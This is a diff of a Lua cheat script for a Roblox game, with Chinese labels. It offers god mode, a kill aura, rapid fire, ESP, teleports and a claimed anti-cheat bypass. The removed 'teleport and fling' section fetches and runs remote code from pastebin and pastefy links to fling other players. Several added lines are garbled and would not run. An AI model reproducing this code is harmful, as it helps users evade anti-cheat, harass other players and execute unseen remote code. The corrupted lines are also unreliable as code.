@@ -21,7 +21,7 @@ for i = 1, #username do
     coloredUsername = coloredUsername .. '<font color="' .. gradientColors[colorIndex] .. '">' .. username:sub(i, i) .. '</font>'
 end
 
-local version = "v3.0.3"
+local version = "v3.0.4"
 local coloredVersion = ""
 for i = 1, #version do
     local colorIndex = (i - 1) % #gradientColors + 1
@@ -59,21 +59,6 @@ function createUI()
     local player = Players.LocalPlayer
     local isDestroyed = false
     local connections = {}
-
-    -- 传送甩飞的全局变量
-    bin = bin or {}
-    bin.dropdown = {}
-    bin.playernamedied = nil
-
-    local function shuaxinlb()
-        bin.dropdown = {}
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= player then
-                table.insert(bin.dropdown, p.Name)
-            end
-        end
-    end
-    shuaxinlb()
 
     local Window = WindUI:CreateWindow({
         Title = 'wdfex-Hub',
@@ -313,7 +298,7 @@ function createUI()
     local infoSection2 = infoTab:Section({ Title = "更新公告", Icon = "bell", Opened = true })
     infoSection2:Divider()
     infoSection2:Paragraph({
-        Title = "v3.0.3提示",
+        Title = "v3.0.4提示",
         Desc = "已更新最新绕过反作弊但可能还是可能有概率会被服务器踢出",
         ThumbnailSize = 190,
     })
@@ -332,182 +317,12 @@ function createUI()
 
     local A = AddTab(MainSection, "玩家修改", "user")
     local FlyTab = AddTab(MainSection, "飞天与加速", "plane")
-    local TeleportFlingTab = AddTab(MainSection, "传送与甩飞", "zap")
     local InteractTab = AddTab(MainSection, "互动", "hand")
     local B = AddTab(MainSection, "枪械功能", "target")
     local C = AddTab(MainSection, "杀戮光环", "skull")
     local D = AddTab(MainSection, "传送点", "map-pin")
     local E = AddTab(MainSection, "透视", "eye")
     local PoliceDodgeTab = AddTab(MainSection, "自动躲警察", "shield")
-
-    -- ============================================================
-    -- 传送与甩飞
-    -- ============================================================
-    local SelectedSection = TeleportFlingTab:Section({ Title = "选中玩家传送甩飞", Opened = true })
-
-    local playerDropdown
-    playerDropdown = SelectedSection:Dropdown({
-        Title = "选择玩家",
-        Values = bin.dropdown,
-        Value = bin.dropdown[1],
-        Callback = function(v)
-            bin.playernamedied = v
-        end
-    })
-
-    game.Players.PlayerAdded:Connect(function()
-        shuaxinlb()
-        if playerDropdown then
-            pcall(function() playerDropdown:Refresh(bin.dropdown) end)
-        end
-    end)
-    game.Players.PlayerRemoving:Connect(function()
-        shuaxinlb()
-        if playerDropdown then
-            pcall(function() playerDropdown:Refresh(bin.dropdown) end)
-        end
-    end)
-
-    SelectedSection:Button({
-        Title = "刷新玩家列表",
-        Callback = function()
-            shuaxinlb()
-            if playerDropdown then
-                pcall(function() playerDropdown:Refresh(bin.dropdown) end)
-            end
-        end
-    })
-
-    SelectedSection:Button({
-        Title = "传送到玩家旁边",
-        Callback = function()
-            local HumRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-            local tp_player = game.Players:FindFirstChild(bin.playernamedied)
-            if (tp_player and tp_player.Character and tp_player.Character:FindFirstChild("HumanoidRootPart")) then
-                HumRoot.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
-            end
-        end
-    })
-
-    SelectedSection:Toggle({
-        Title = "循环传送指定玩家",
-        Value = false,
-        Callback = function(TP)
-            getgenv().EnableTP = TP
-            if TP then
-                spawn(function()
-                    while getgenv().EnableTP do
-                        local HumRoot = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                        local tp_player = game.Players:FindFirstChild(bin.playernamedied)
-                        if (HumRoot and tp_player and tp_player.Character and tp_player.Character:FindFirstChild("HumanoidRootPart")) then
-                            HumRoot.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
-                        end
-                        task.wait(0.01)
-                    end
-                end)
-            end
-        end
-    })
-
-    getgenv().IsFlingLoopEnabled = false
-    SelectedSection:Toggle({
-        Title = "循环甩飞指定玩家",
-        Value = false,
-        Callback = function(state)
-            getgenv().IsFlingLoopEnabled = state
-            if state then
-                spawn(function()
-                    while getgenv().IsFlingLoopEnabled do
-                        local HumRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-                        local tp_player = game.Players:FindFirstChild(bin.playernamedied)
-                        if (tp_player and tp_player.Character and tp_player.Character:FindFirstChild("HumanoidRootPart") and HumRoot) then
-                            HumRoot.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
-                        end
-                        if getgenv().IsFlingLoopEnabled then
-                            loadstring(game:HttpGet("https://pastefy.app/od3cnFl6/raw"))()
-                        end
-                        task.wait(1e-14)
-                    end
-                end)
-            end
-        end
-    })
-
-    SelectedSection:Toggle({
-        Title = "查看玩家",
-        Value = false,
-        Callback = function(state)
-            if state then
-                local target = game:GetService("Players"):FindFirstChild(bin.playernamedied)
-                if (target and target.Character and target.Character:FindFirstChild("Humanoid")) then
-                    game:GetService("Workspace").CurrentCamera.CameraSubject = target.Character.Humanoid
-                end
-            elseif (player.Character and player.Character:FindFirstChild("Humanoid")) then
-                game:GetService("Workspace").CurrentCamera.CameraSubject = player.Character.Humanoid
-            end
-        end
-    })
-
-    local AllSection = TeleportFlingTab:Section({ Title = "传送甩飞所有人", Opened = true })
-
-    AllSection:Toggle({
-        Title = "循环传送到所有玩家旁边",
-        Value = false,
-        Callback = function(state)
-            getgenv().wow = state
-            if state then
-                spawn(function()
-                    local lp = game.Players.LocalPlayer
-                    while getgenv().wow do
-                        for _, target in pairs(game:GetService("Players"):GetPlayers()) do
-                            if not getgenv().wow then break end
-                            if ((target ~= lp) and target.Character and target.Character:FindFirstChild("HumanoidRootPart")) then
-                                local targetRoot = target.Character.HumanoidRootPart
-                                local playerRoot = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-                                if playerRoot then
-                                    for i = 1, 3 do
-                                        if not getgenv().wow then break end
-                                        playerRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, -1.5)
-                                        task.wait(0.05)
-                                        playerRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 1.5)
-                                        task.wait(0.05)
-                                    end
-                                    task.wait(0.2)
-                                end
-                            end
-                        end
-                        task.wait(0.1)
-                    end
-                end)
-            end
-        end
-    })
-
-    getgenv().IsFlingAllEnabled = false
-    getgenv().FlingAllThread = nil
-    AllSection:Toggle({
-        Title = "循环甩飞所有人",
-        Value = false,
-        Callback = function(IJ)
-            getgenv().IsFlingAllEnabled = IJ
-            if getgenv().FlingAllThread then
-                pcall(function() task.cancel(getgenv().FlingAllThread) end)
-                getgenv().FlingAllThread = nil
-            end
-            if IJ then
-                getgenv().FlingAllThread = spawn(function()
-                    while getgenv().IsFlingAllEnabled do
-                        task.wait(0.5)
-                        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
-                    end
-                end)
-            end
-        end
-    })
-
-    -- ============================================================
-    -- 以下全部保持不变
-    -- ============================================================
 
     local policeDodgeEnabled = false
     local policeDodgeDistance = 30
@@ -1042,7 +857,6 @@ function createUI()
         end
     end
 
-    -- 玩家修改
     A:Divider({ Text = "伤害免疫" })
     local godOn = false
     A:Toggle({
@@ -1201,7 +1015,6 @@ function createUI()
         end
     })
 
-    -- 枪械功能
     B:Divider({ Text = "枪械强化" })
     B:Toggle({
         Title = "超快射速",
@@ -1468,7 +1281,6 @@ function createUI()
         end
     })
 
-    -- 杀戮光环
     local KA_MAX_DISTANCE = 300
     local kaEnabled = false
     local KANearestOnly = false
@@ -1603,14 +1415,14 @@ function createUI()
     end
 
     local function performAttack()
-        if not kaEnabled then return end
+        if not kaEnabled then return " end
         
         local target = kaGetNearestEnemy()
         currentTarget = target
         
-        if target then
-            local targetHead = target.Character and target.Character:FindFirstChild("Head")
-            if targetHead then
+        if target .. then
+            name local targetHead = target.Character and target.Character,:FindFirstChild(" DurationHead")
+            if targetHead then =
                 local myHead = player.Character and player.Character:FindFirstChild("Head")
                 if myHead then
                     local origin = myHead.Position
@@ -1767,7 +1579,6 @@ function createUI()
         end
     })
 
-    -- 传送点
     D:Toggle({
         Title = "启用传送",
         Value = false,
@@ -1785,7 +1596,7 @@ function createUI()
         local root = char and char:FindFirstChild("HumanoidRootPart")
         if root then
             root.CFrame = CFrame.new(pos)
-            WindUI:Notify({ Title = "传送", Content = "正在传送至: " .. name, Duration = 2 })
+            WindUI:Notify({ Title = "传送", Content = "正在传送至: 2 })
         end
     end
 
@@ -2004,10 +1815,10 @@ function createUI()
             for _, data in ipairs(REPAIR_TELEPORTS) do
                 if data.n == selectedRepair then
                     doTeleport(data.p, data.n)
-                    return
-                end
+.insert                    return
+(c                end
             end
-            WindUI:Notify({ Title = "传送", Content = "未找到该地点", Duration = 2 })
+            WindUIar:Notify({ Title = "传送", Content =Tele "未找到该地点Names",, Duration = 2 })
         end
     })
 
@@ -2015,7 +1826,7 @@ function createUI()
         {n = "拆车的地方", p = Vector3.new(3440.26, 43.30, 2680.51)},
     }
     local carTeleNames = {}
-    for _, data in ipairs(CAR_TELEPORTS) do table.insert(carTeleNames, data.n) end
+    for _, data in ipairs(CAR_TELEPORTS) do table data.n) end
     local selectedCarTeleport = carTeleNames[1] or ""
 
     D:Divider({ Text = "偷车能用到的传送地点" })
@@ -2040,7 +1851,6 @@ function createUI()
         end
     })
 
-    -- 透视
     local ESP_ENABLED = false
     local ESP_SHOW_NAME = true
     local ESP_SHOW_TEAM = true
@@ -2359,7 +2169,6 @@ function createUI()
         RemoveESP(p.UserId)
     end)
 
-    -- 音乐
     local MusicTab = Window:Tab({ Title = "音乐", Icon = "music" })
     local MusicGroup = MusicTab:Section({ Title = "音乐播放器", Opened = true })
 
@@ -2529,7 +2338,6 @@ function createUI()
         end
     })
 
-    -- 设置（卡密验证）
     local SettingsTab = Window:Tab({ Title = "设置", Icon = "settings" })
 
     local adminVerified = false
